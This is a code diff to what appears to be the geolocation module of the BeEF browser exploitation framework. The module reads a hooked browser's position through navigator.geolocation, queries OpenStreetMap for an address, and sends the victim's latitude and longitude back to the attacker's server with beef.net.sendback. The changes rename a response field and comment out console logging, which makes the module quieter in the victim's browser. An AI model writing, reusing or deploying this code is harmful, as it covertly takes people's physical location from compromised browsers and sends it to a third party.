@@ -17,23 +17,29 @@ beef.geolocation = {
      */
     getOpenStreetMapAddress: function(command_url, command_id, latitude, longitude){
 
+        // fixes damned issues with jquery 1.5, like this one:
+        // http://bugs.jquery.com/ticket/8084
+        $j.ajaxSetup({
+            jsonp: null,
+            jsonpCallback: null
+        });
+
         $j.ajax({
-            dataType: "json",
             error: function(xhr, status, error){
-                console.log("[geolocation.js] openstreetmap error");
+                //console.log("[geolocation.js] openstreetmap error");
                 beef.net.sendback(command_url, command_id, "latitude=" + latitude
                              + "&longitude=" + longitude
-                             + "&openStreetMap=UNAVAILABLE"
+                             + "&osm=UNAVAILABLE"
                              + "&geoLocEnabled=True");
                 },
             success: function(data, status, xhr){
-                console.log("[geolocation.js] openstreetmap success");
-                // commenting it for now, it seems there are issues with the returned json
-                //var jsonData = $j.parseJSON(data);
+                //console.log("[geolocation.js] openstreetmap success");
+                var jsonResp = $j.parseJSON(data);
+
                 beef.net.sendback(command_url, command_id, "latitude=" + latitude
                              + "&longitude=" + longitude
-                             //+ "&openStreetMap=" + jsonData.display_name
-                             + "&openStreetMap=UNAVAILABLE"
+//                             + "&osm=" + encodeURI(jsonResp.display_name)
+                              + "&osm=tofix"
                              + "&geoLocEnabled=True");
                 },
             type: "get",
@@ -52,16 +58,16 @@ beef.geolocation = {
 	        beef.net.sendback(command_url, command_id, "latitude=NOT_ENABLED&longitude=NOT_ENABLED&geoLocEnabled=False");	
 			return;
 		}
-        console.log("[geolocation.js] navigator.geolocation.getCurrentPosition");
+        //console.log("[geolocation.js] navigator.geolocation.getCurrentPosition");
         navigator.geolocation.getCurrentPosition( //note: this is an async call
 			function(position){ // success
 				var latitude = position.coords.latitude;
         		var longitude = position.coords.longitude;
-                console.log("[geolocation.js] success getting position. latitude [%d], longitude [%d]", latitude, longitude);
+                //console.log("[geolocation.js] success getting position. latitude [%d], longitude [%d]", latitude, longitude);
                 beef.geolocation.getOpenStreetMapAddress(command_url, command_id, latitude, longitude);
 
 			}, function(error){ // failure
-                    console.log("[geolocation.js] error [%d] getting position", error.code);
+                    //console.log("[geolocation.js] error [%d] getting position", error.code);
 					switch(error.code) // Returns 0-3
 					{
 						case 0:
